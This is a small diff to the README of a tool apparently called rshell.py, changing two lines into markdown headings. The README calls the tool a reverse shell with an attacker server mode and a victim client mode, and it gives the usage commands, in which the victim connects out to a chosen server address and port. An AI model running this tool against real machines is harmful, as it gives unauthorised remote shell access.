@@ -7,11 +7,11 @@
 
 You can run this program either as a server (attacker) or client (victim)
 
-To run as a server:
+## To run as a server:
 ```
   python3 rshell.py -m server -p port_number
 ```
-To run as a client:
+## To run as a client:
 ```
   python3 rshell.py -m client -t server_ip_address -p server_port_number
 ```
